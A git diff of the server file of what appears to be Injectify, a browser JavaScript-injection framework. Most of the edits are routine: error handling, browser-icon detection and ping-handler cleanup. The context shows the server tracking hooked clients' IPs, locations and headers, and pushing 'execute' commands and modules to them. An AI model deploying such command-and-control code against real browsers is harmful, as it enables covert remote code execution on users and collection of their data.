@@ -110,11 +110,14 @@ MongoClient.connect(config.mongodb, function (err, db) {
             'User-Agent': 'Injectify'
           }
         }, (error, response, user) => {
+          if (error) {
+            console.error(error)
+            return
+          }
           try {
             user = JSON.parse(user)
           } catch (e) {
-            console.log(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve user API '), user)
-            console.error(e)
+            console.error(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve user API '))
             reject({
               title: 'Could not authenticate you',
               message: 'Failed to parse the GitHub user API response'
@@ -1071,23 +1074,45 @@ MongoClient.connect(config.mongodb, function (err, db) {
           'Accept': 'application/json'
         }
       }, (error, response, parsedIP) => {
-        if (error) throw error
         try {
           ip = JSON.parse(parsedIP)
         } catch (e) {
-
+          error = true
         }
-        let country = 'https://twemoji.maxcdn.com/2/svg/2753.svg'
-        if (ip.country) country = 'https://twemoji.maxcdn.com/2/svg/' + twemoji.convert.toCodePoint(flag(ip.country)) + '.svg'
+        if (!error) {
+          var agent = parseAgent(socket.headers['user-agent'])
+          var browser = '/assets/svg/default.svg'
+          if (socket.headers['user-agent'].includes('SamsungBrowser')) {
+            browser = '/assets/svg/samsung.svg'
+          } else if (socket.headers['user-agent'].includes('Edge')) {
+            browser = '/assets/svg/edge.svg'
+          } else if (socket.headers['user-agent'].includes('Trident')) {
+            browser = '/assets/svg/ie.svg'
+          } else if (agent.browser.name) {
+            var browserName = agent.browser.name.toLowerCase()
+            if (browserName == 'chrome') {
+              browser = '/assets/svg/chrome.svg'
+            } else if (browserName == 'firefox') {
+              browser = '/assets/svg/firefox.svg'
+            } else if (browserName == 'safari') {
+              browser = '/assets/svg/safari.svg'
+            } else if (browserName == 'opera') {
+              browser = '/assets/svg/opera.svg'
+            } else if (browserName == 'ie') {
+              browser = '/assets/svg/ie.svg'
+            }
+          }
+          var country = 'https://twemoji.maxcdn.com/2/svg/2753.svg'
+          if (ip.country) country = 'https://twemoji.maxcdn.com/2/svg/' + twemoji.convert.toCodePoint(flag(ip.country)) + '.svg' 
+        }
         inject.clients[project.id].push({
           id: data.id,
           debug: inDebug,
-          browser: {
-            'user-agent': parseAgent(socket.headers['user-agent'])
-          },
+          'user-agent': agent,
           ip: ip,
           images: {
-            country: country
+            country: country,
+            browser: browser
           },
           socket: {
             headers: socket.headers,
@@ -1120,10 +1145,6 @@ MongoClient.connect(config.mongodb, function (err, db) {
             send('execute', data)
           })
   
-          on('ping', data => { // execute
-            send('pong')
-          })
-  
           on('module', data => { // load a module
             if (!data.name) return
             var js = inject.modules[data.name]
@@ -1144,8 +1165,8 @@ MongoClient.connect(config.mongodb, function (err, db) {
             console.log(data)
           })
   
-          on('ping', data => {
-            let difference = +new Date() - data
+          on('ping', pingTime => { // ping
+            let difference = +new Date() - pingTime
             send('pong', difference)
           })
   
